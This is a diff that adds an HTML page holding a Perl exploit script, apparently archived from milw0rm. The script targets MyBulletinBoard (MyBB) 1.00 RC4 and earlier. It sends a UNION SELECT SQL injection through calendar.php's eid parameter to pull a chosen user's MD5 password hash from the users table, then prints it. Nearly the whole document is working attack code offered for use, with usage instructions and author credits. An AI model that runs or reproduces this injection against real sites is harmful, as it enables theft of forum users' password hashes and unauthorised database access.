@@ -1,0 +1,31 @@
+<html><head><title>MyBulletinBoard (MyBB) <= 1.00 RC4 SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w
+#
+# SQL Injection Exploit for MyBulletinBoard (MyBB) &lt;= 1.00 RC4
+# This exploit show the MD5 crypted password of the user id you've chose
+# Related advisory: 
+# Patch: http://www.mybboard.com/community/showthread.php?tid=2559
+# http://fain182.badroot.org
+# http://www.codebug.org
+# Discovered by Alberto Trivero and coded with FAiN182
+
+use LWP::Simple;
+
+print &quot;\n\t===========================================\n&quot;;
+print &quot;\t= Exploit for MyBulletinBoard &lt;= 1.00 RC4 =\n&quot;;
+print &quot;\t= Alberto Trivero &amp; FAiN182 - codebug.org =\n&quot;;
+print &quot;\t===========================================\n\n&quot;;
+
+if(!$ARGV[0] or !$ARGV[1]) {
+   print &quot;Usage:\nperl $0 [full_target_path] [user_id]\n\nExample:\nperl $0 http://www.example.com/mybb/ 1\n&quot;;
+   exit(0);
+}
+
+$url = &quot;calendar.php?action=event&amp;eid='%20UNION%20SELECT%20uid,uid,null,null,null,null,password,null%20FROM%20mybb_users%20WHERE%20uid=$ARGV[1]/*&quot;;
+$page = get($ARGV[0].$url) || die &quot;[-] Unable to retrieve: $!&quot;;
+print &quot;[+] Connected to: $ARGV[0]\n&quot;;
+$page =~ m/&lt;td&gt;&lt;strong&gt;(.*?)&lt;\/strong&gt;/ &amp;&amp; print &quot;[+] User ID is: $1\n&quot;;
+print &quot;[-] Unable to retrieve User ID\n&quot; if(!$1);
+$page =~ m/&lt;a href=&quot;member\.php\?action=profile&amp;uid=&quot;&gt;(.*?)&lt;\/a&gt;/ &amp;&amp; print &quot;[+] MD5 hash of password is: $1\n&quot;;
+print &quot;[-] Unable to retrieve hash of password\n&quot; if(!$1);
+
+# milw0rm.com [2005-05-31]</pre></html>
